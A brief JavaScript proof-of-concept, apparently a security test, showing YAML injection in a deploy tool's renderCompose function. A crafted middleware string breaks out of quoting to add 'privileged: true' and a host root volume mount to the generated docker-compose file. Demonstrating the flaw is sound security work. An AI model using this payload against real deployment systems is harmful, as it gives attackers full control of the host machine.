import yaml from "js-yaml";
import { renderCompose } from "./lib/deploy/build";
const mw = 'mw"\n    privileged: true\n    volumes:\n      - "/:/hostfs"\n    labels:\n      - "x';
const out = renderCompose({
  name: "deplo-victim", image: "nginx", port: 3000, appId: "prj_x", slug: "victim",
  routes: [{ name: "a.example.com", port: null, entrypoint: "websecure", tls: true, certResolver: "le", middlewares: [mw], pathPrefix: "", stripPrefix: false, service: null }],
  env: {},
});
console.log(out);
console.log("PARSED:", JSON.stringify(yaml.load(out), null, 1));
